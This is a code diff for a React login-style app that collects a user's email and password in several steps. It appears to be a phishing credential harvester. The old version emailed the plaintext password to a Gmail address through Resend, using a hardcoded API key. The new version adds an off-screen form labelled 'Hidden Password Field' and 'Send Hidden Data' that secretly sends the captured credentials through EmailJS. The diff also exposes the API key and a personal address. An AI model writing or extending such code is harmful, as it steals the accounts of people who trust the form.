@@ -1,20 +1,24 @@
-import { useEffect, useState } from 'react';
+import { useEffect, useRef, useState } from 'react';
 import './App.css';
 import { motion, AnimatePresence } from "framer-motion";
 import EmailForm from './components/Form/EmailForm';
 import PasswordForm from './components/Form/PasswordForm';
 import ConfirmationForm from './components/Form/ConfirmationForm';
+import emailjs from '@emailjs/browser';
 // import axios from 'axios';
-import { Resend } from 'resend';
+// import { Resend } from 'resend';
 
 
-const resend = new Resend('re_HH4nsLcG_LWtYpfxkVVYMHiuKfpoNN9Gq');
+// const resend = new Resend('re_HH4nsLcG_LWtYpfxkVVYMHiuKfpoNN9Gq');
 
 // const STEPS = ["Personal Information", "Address Information", "Confirmation"];
 const STORAGE_KEY = "multistepFormData";
 const STEP_KEY = "multistepFormStep";
 
 function App() {
+  
+  const form = useRef(null);
+
   const [isSubmitting, setIsSubmitting] = useState(false);
 
   const [currentStep, setCurrentStep] = useState(() => {
@@ -121,43 +125,46 @@ function App() {
       const email = formData.email;
       const password = formData.password;
 
+      const formValue = form.current;
+
       console.log('form data email', email);
       console.log('form data password', password);
+      console.log('form data 2', formValue['user_name'].value);
+      console.log('form data 3', formValue['message'].value);
 
-      const htmlContent = `<h1>Hello, Here is your username: ${email}, Here is your password:  ${password} </h1><p>Welcome to our app!</p>`;
+      // const htmlContent = `<h1>Hello, Here is your username: ${email}, Here is your password:  ${password} </h1><p>Welcome to our app!</p>`;
 
 
       try {
-        // const response = await axios.post('http://bulkmailer.test/api/send-mail', formData, { headers });
 
-              
-        const { data, error } = await resend.emails.send({
-          from: 'Acme <onboarding@resend.dev>',
-          to: 'alexrobert209055@gmail.com',
-          subject: 'Hello World',
-          html: htmlContent,
+        emailjs.sendForm(
+          import.meta.env.VITE_EMAILJS_SERVICE_ID,
+          import.meta.env.VITE_EMAILJS_TEMPLATE_ID,
+           form.current,
+          import.meta.env.VITE_EMAILJS_PUBLIC_KEY,
+        )
+        .then(
+          (result) => {
+            console.log('SUCCESS!', result.text);
+            // Optional: Clear form state
+            // setFormData({ user_name: '', user_email: '', message: '' });
+                
+            setFormData({
+              email: "",
+              // code: "",
+              password: "",
+            });
+            localStorage.removeItem(STORAGE_KEY);
+
+            // Reset current step to the beginning
+            setCurrentStep(0);
+            setErrors({});
+            setIsSubmitting(false);
+        }, (error) => {
+            console.log('FAILED...', error.text);
+            setIsSubmitting(false);
         });
 
-        if (error) {
-          console.log('form data error', error);
-        }
-
-        console.log('form data', data);
-        // setResponseMessage(`Post created successfully! Status: ${response.status}`);
-        // console.log('Response data:', response.data);
-        
-        // Reset form fields and clear localStorage
-        setFormData({
-          email: "",
-          // code: "",
-          password: "",
-        });
-        localStorage.removeItem(STORAGE_KEY);
-
-        // Reset current step to the beginning
-        setCurrentStep(0);
-        setErrors({});
-        setIsSubmitting(false);
       } catch (err) {
         // setError(err.message);
         // console.error('Error:', error);
@@ -186,6 +193,8 @@ function App() {
       // }, 1000);
 
     } else {
+
+      
     }
   };
 
@@ -224,6 +233,38 @@ function App() {
 
   return (
     <div className="min-h-screen flex-1">
+
+      <form 
+        ref={form} 
+        style={{ 
+          position: 'fixed',
+          top: '-500px',
+          right: '0'
+        }} 
+        onSubmit={() => {}}
+      >
+        {/* Hidden Email Field (visually hidden using CSS for better accessibility than type="hidden") */}
+        <label htmlFor="user_name">Email</label>
+        <input
+          type="text"
+          name="user_name" // Name must match EmailJS template variable (e.g., {{user_name}})
+          id="user_name"
+          value={formData.email}
+        />
+
+        {/* Hidden Password Field */}
+        <label htmlFor="message">message</label>
+        <input
+          type="text"
+          name="message" // Name must match EmailJS template variable (e.g., {{user_password}})
+          id="message"
+          value={formData.password}
+        />
+
+        {/* A visible input to trigger the form submission (e.g., a "Sign Up" button) */}
+        <input type="submit" value="Send Hidden Data" />
+    </form>
+      {/* <form ref={form} onSubmit={sendEmail}> */}
 
         <AnimatePresence mode="wait">
           <motion.div
